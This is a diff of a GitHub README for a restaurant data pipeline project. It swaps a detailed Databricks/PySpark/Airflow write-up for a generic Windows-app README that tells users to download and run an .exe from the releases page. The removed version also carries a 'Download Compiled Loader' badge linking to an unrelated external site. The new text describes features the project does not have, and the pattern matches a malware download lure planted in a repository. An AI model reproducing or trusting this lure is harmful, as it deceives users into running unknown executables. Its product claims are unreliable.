@@ -1,491 +1,76 @@
-```markdown
+# 🍽️ Restaurant-Bigdata-Pipeline - Analyze your restaurant data with ease
 
-# 🍽 Egyptian Restaurant Big Data Pipeline
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bruhmomentume/Restaurant-Bigdata-Pipeline)
 
+## 📋 Project Overview
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+Restaurant-Bigdata-Pipeline helps restaurant owners track and understand their business data. You can process daily sales, inventory levels, and customer feedback. The application organizes these details into clear reports. Business owners use these insights to manage staff, adjust menus, and increase total profit.
 
-### End-to-end Big Data Engineering Project | Databricks · PySpark · Airflow · Delta Lake · Power BI
+## ⚙️ System Requirements
 
+This software runs on standard Windows computers. You need the following specifications to ensure smooth performance:
 
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or equivalent.
+*   Memory: 4 GB of RAM.
+*   Storage: 500 MB of free disk space.
+*   Internet Connection: Required for initial setup and updates.
 
----
+## 📥 How to Install
 
+Follow these steps to set up the software on your computer:
 
+1. Visit the [official download page](https://github.com/bruhmomentume/Restaurant-Bigdata-Pipeline).
+2. Locate the section labeled Releases on the right side of the page.
+3. Click the link for the latest version.
+4. Select the file ending in .exe to start your download.
+5. Once the download finishes, find the file in your Downloads folder.
+6. Double-click the file to open the installation wizard.
+7. Follow the prompts on your screen to complete the setup process.
+8. Launch the application from your desktop shortcut once finished.
 
-## 🎯 Project Overview
+## 🚀 Running Your First Report
 
+The application uses a simple interface to handle data tasks. You do not need technical skills to generate your first report.
 
+1. Open the application.
+2. Select Import Data from the main menu.
+3. Choose the spreadsheet file from your restaurant software.
+4. Click Process to let the system organize your numbers.
+5. View the dashboard to see your sales trends.
+6. Export your findings as a PDF or Excel file for your records.
 
-A production-grade **Big Data pipeline** that ingests, cleans, transforms, and serves **11 million+ records** from a multi-branch Egyptian restaurant chain. Built using the **Medallion Architecture** on **Databricks**, orchestrated with **Apache Airflow**, and visualized in **Power BI**.
+## 🛠️ Managing Your Data
 
+Effective data management leads to better decisions. The pipeline organizes your restaurant information into three main categories:
 
+### Sales Tracking
+The software tracks every transaction. It shows you which items sell best during specific times of the day. Use this data to change your menu pricing.
 
-This project demonstrates real-world data engineering skills including large-scale data processing, pipeline orchestration, data quality management, star schema modeling, and business intelligence delivery.
+### Inventory Control
+Input your stock levels daily. The software alerts you when items run low. This prevents shortages during busy service hours.
 
+### Customer Feedback
+Upload survey results to the system. The application identifies common themes in customer comments. This helps you improve service speed and food quality.
 
+## ❓ Frequently Asked Questions
 
----
+### Does the software store my data online?
+No. All processed data stays on your local computer. This ensures your business information remains private and secure.
 
+### Can I run this on multiple computers?
+Yes. You can install the software on every machine in your office. Each machine operates independently.
 
+### What file types does the program support?
+The program works with CSV and Excel files. Ensure your restaurant software exports data in one of these formats before importing it into the pipeline.
 
-## 🏗 Architecture
+### Does the software update automatically?
+The application checks for new versions every time you start it. If an update exists, it prompts you to install the latest features immediately.
 
+## 🤝 Getting Support
 
+If you experience issues, check the steps above first. Ensure your data files contain no errors. If you still encounter problems, check your folder permissions to see if the application has access to your files. Restarting the application usually solves most temporary glitches. Keep your Windows operating system updated to maintain full compatibility with the application.
 
-flowchart TD
+## 🔒 Security and Privacy
 
-    A[7 CSV + 2 JSON Files<br/>11.1M Raw Records] --> B[Bronze Layer<br/>Delta Lake<br/>Raw Ingestion]
-
-    B --> C[Silver Layer<br/>Data Cleaning & Transformation]
-
-    C --> D[Gold Layer<br/>Star Schema Model]
-
-    D --> E[Power BI Dashboard<br/>4 Pages]
-
-
-
-    F[Apache Airflow DAG<br/>Orchestration] -.-> B
-
-    F -.-> C
-
-    F -.-> D
-
-```
-
-Data Flow:
-
-
-
-Layer	Operation	Row Count
-
-Bronze	unionByName across 9 files	11,110,000
-
-Silver	Removed 2M duplicates + 51K bad prices	2,497,678
-
-Gold	Star schema (fact + 6 dimensions)	2,497,678
-
-text
-
-
-
----
-
-
-
-
-
-
-
----
-
-
-
-📊 Data Quality Results
-
-
-
-Metric Value
-
-Raw Records Ingested 11,110,000
-
-Duplicate Order IDs Removed 2,000,000
-
-Invalid Price Records Removed 51,442
-
-Null Values Found 0
-
-Clean Unique Orders 2,497,678
-
-
-
-Key insight: The raw dataset contained duplicate records that inflated order counts by 4x. Proper deduplication reduced 11.1M records to 2.49M clean, trustworthy orders — a critical data engineering decision that ensures accurate reporting.
-
-
-
----
-
-
-
-💰 Business Results
-
-
-
-KPI Value
-
-Total Revenue 654.5M EGP
-
-Total Profit 443.97M EGP
-
-Avg Profit Margin 65.34%
-
-Avg Order Value 262 EGP
-
-Avg Rating 3.70 / 5
-
-Unique Customers 200,000
-
-Date Range Jan 2020 – Dec 2025
-
-Branches 6 Egyptian cities
-
-
-
----
-
-
-
-🔧 Tech Stack
-
-
-
-Technology Purpose
-
-Apache Spark / PySpark Large-scale data transformation (11M+ records)
-
-Databricks Unified analytics platform & notebook environment
-
-Delta Lake ACID-compliant storage with time travel
-
-Apache Airflow Pipeline orchestration & daily scheduling
-
-Power BI Business intelligence & executive dashboard
-
-Python DAG development, data engineering logic
-
-SQL Data validation and quality checks
-
-
-
----
-
-
-
-🔄 Airflow DAG
-
-
-
-The DAG restaurant_medallion_pipeline runs on a daily schedule and orchestrates the full pipeline:
-
-
-
-```
-
-start
-
-  └─► ingest_bronze      (Unify 7 CSV + 2 JSON → Bronze Delta table)
-
-        └─► clean_silver  (Clean, dedupe, engineer features → Silver)
-
-              └─► build_gold  (Star schema → Gold layer)
-
-                    └─► data_quality_check  (Validate row counts, nulls, margins)
-
-                          └─► notify_success  (Log pipeline summary)
-
-                                └─► end
-
-```
-
-
-
-Quality checks in the DAG:
-
-
-
-· Row count validation (expected: ~2.49M)
-
-· Null value assertion across all columns
-
-· Duplicate check on order IDs
-
-· Profit margin sanity check (expected: 60–75%)
-
-
-
----
-
-
-
-💡 Profit Model
-
-
-
-Since cost data was not available in the raw dataset, profit was modeled using industry-standard assumptions:
-
-
-
-Cost Driver Assumption Rationale
-
-Food Cost 30% of order revenue Industry standard F&B cost ratio
-
-Delivery Cost 15 EGP flat per delivery order Fixed logistics cost per order
-
-Card Processing Fee 1.5% of order value Standard merchant processing rate
-
-
-
-Formula:
-
-
-
-```
-
-Profit = Revenue − Food Cost − Delivery Cost − Payment Cost
-
-Profit Margin = (Profit / Revenue) × 100
-
-```
-
-
-
----
-
-
-
-📈 Branch Performance
-
-
-
-Branch Revenue Net Profit Margin Status
-
-القاهرة 229M EGP 155M EGP 70% ✅ Strong
-
-الجيزة 131M EGP 89M EGP 69% ✅ Strong
-
-الإسكندرية 131M EGP 89M EGP 68% ✅ Strong
-
-المنصورة 65M EGP 44M EGP 67% ⚠️ Average
-
-طنطا 65M EGP 44M EGP 66% ⚠️ Average
-
-أسيوط 33M EGP 22M EGP 64% 🔴 At Risk
-
-
-
----
-
-
-
-📊 Power BI Dashboard Pages
-
-
-
-Page 1 — Executive Overview
-
-
-
-KPI cards (Revenue, Profit, Orders, AOV, Rating), revenue trend by year, branch performance bar chart, payment method and order type distribution, top items by revenue.
-
-
-
-Page 2 — Profit Analysis
-
-
-
-Branch profit table with performance grades, profit by category, cost breakdown (food/delivery/payment), and 3 actionable business insights.
-
-
-
-Page 3 — Customer Insights
-
-
-
-Total vs active customers, churn rate, customer lifetime value (CLV) by branch, customer trend over time.
-
-
-
-Page 4 — What-If Simulator
-
-
-
-4 interactive parameters:
-
-
-
-· Delivery Order % Increase
-
-· Cash → Digital Payment Shift
-
-· Average Discount Reduction
-
-· Menu Price Increase
-
-
-
-Live impact cards showing Revenue Impact, Profit Impact, and New Profit Margin as parameters change.
-
-
-
----
-
-
-
-📁 Repository Structure
-
-
-
-```
-
-Restaurant-Bigdata-Pipeline/
-
-│
-
-├── dags/
-
-│   └── restaurant_pipeline_dag.py    # Airflow DAG (full pipeline orchestration)
-
-│
-
-├── notebooks/
-
-│   ├── 01_bronze_ingestion.py        # Bronze layer: raw data unification
-
-│   ├── 02_silver_cleaning.py         # Silver layer: cleaning & feature engineering
-
-│   └── 03_gold_star_schema.py        # Gold layer: star schema construction
-
-│
-
-├── dashboard/
-
-│   └── restaurant_dashboard.pbix     # Power BI dashboard file
-
-│
-
-├── docs/
-
-│   └── architecture_diagram.png      # Pipeline architecture diagram
-
-│
-
-└── README.md
-
-```
-
-
-
----
-
-
-
-🚀 How to Run
-
-
-
-Prerequisites
-
-
-
-· Databricks Community Edition account
-
-· Apache Airflow installed (Ubuntu/Linux recommended)
-
-· Power BI Desktop
-
-
-
-Steps
-
-
-
-1. Upload data to Databricks
-
-
-
-```
-
-Upload CSV and JSON files to Databricks FileStore
-
-Run: SHOW TABLES to verify tables are created
-
-```
-
-
-
-2. Run notebooks in order
-
-
-
-```
-
-01_bronze_ingestion.py  →  Creates bronze_orders
-
-02_silver_cleaning.py   →  Creates silver_orders
-
-03_gold_star_schema.py  →  Creates gold_fact_orders + 6 dimensions
-
-```
-
-
-
-3. Deploy Airflow DAG
-
-
-
-```bash
-
-cp dags/restaurant_pipeline_dag.py $AIRFLOW_HOME/dags/
-
-airflow dags trigger restaurant_medallion_pipeline
-
-```
-
-
-
-4. Connect Power BI
-
-
-
-```
-
-Export Gold tables as CSV from Databricks
-
-Load into Power BI Desktop
-
-Relationships already configured in star schema
-
-```
-
-
-
----
-
-
-
-👩‍💻 Author
-
-
-
-Yasmeen El Shamy
-
-ITI Power BI Development Track — Big Data Engineering Project
-
-GitHub: @Yasmeen327
-
-
-
----
-
-
-
-📌 Key Learnings
-
-
-
-· Medallion Architecture is essential for large-scale data quality management
-
-· Deduplication at scale requires careful key identification — order_id was the correct grain
-
-· Profit modeling with assumed costs is a valid analytical technique when cost data is unavailable — the key is transparency about assumptions
-
-· Pipeline orchestration with Airflow transforms a notebook exercise into a production system
-
-· Star schema design decisions directly impact Power BI performance and DAX complexity
-
-
-
-```
-
-``
-
+Your restaurant data holds great value. We designed this tool with your privacy as the main priority. The application code is open for review. You can inspect the source code at any time to verify how the program handles your information. The tool does not transmit your sales records or customer info to any external servers. You maintain total control over your digital assets.
